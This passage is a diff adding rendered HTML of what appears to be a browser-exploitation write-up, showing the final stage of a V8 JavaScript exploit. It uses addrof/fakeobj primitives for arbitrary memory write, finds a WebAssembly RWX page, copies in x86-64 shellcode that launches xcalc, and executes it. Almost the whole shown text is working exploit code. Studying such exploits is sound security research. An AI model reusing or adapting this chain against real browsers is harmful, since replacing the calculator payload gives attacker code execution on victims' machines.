+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
+
+    <span class="c1">// Change the elements pointer using our crafted array to write_addr-0x10</span>
+    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
+
+    <span class="c1">// Write to index 0 as a floating point value</span>
+    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Creating an RWX page using WebAssembly</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="c1">// https://wasdk.github.io/WasmFiddle/</span>
+<span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
+<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+
+<span class="kd">var</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="nx">n</span><span class="o">+</span><span class="mh">0x88</span><span class="nx">n</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] RWX Wasm page addr: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">rwx_page_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
+    <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// https://xz.aliyun.com/t/5003</span>
+<span class="kd">var</span> <span class="nx">shellcode</span><span class="o">=</span><span class="p">[</span><span class="mh">0x90909090</span><span class="p">,</span><span class="mh">0x90909090</span><span class="p">,</span><span class="mh">0x782fb848</span><span class="p">,</span><span class="mh">0x636c6163</span><span class="p">,</span><span class="mh">0x48500000</span><span class="p">,</span><span class="mh">0x73752fb8</span><span class="p">,</span><span class="mh">0x69622f72</span><span class="p">,</span><span class="mh">0x8948506e</span><span class="p">,</span><span class="mh">0xc03148e7</span><span class="p">,</span><span class="mh">0x89485750</span><span class="p">,</span><span class="mh">0xd23148e6</span><span class="p">,</span><span class="mh">0x3ac0c748</span><span class="p">,</span><span class="mh">0x50000030</span><span class="p">,</span><span class="mh">0x4944b848</span><span class="p">,</span><span class="mh">0x414c5053</span><span class="p">,</span><span class="mh">0x48503d59</span><span class="p">,</span><span class="mh">0x3148e289</span><span class="p">,</span><span class="mh">0x485250c0</span><span class="p">,</span><span class="mh">0xc748e289</span><span class="p">,</span><span class="mh">0x00003bc0</span><span class="p">,</span><span class="mh">0x050f00</span><span class="p">];</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Copying xcalc shellcode to RWX page</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Popping calc</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="nx">f</span><span class="p">();</span>
+</code></pre></div></div>
+:ET
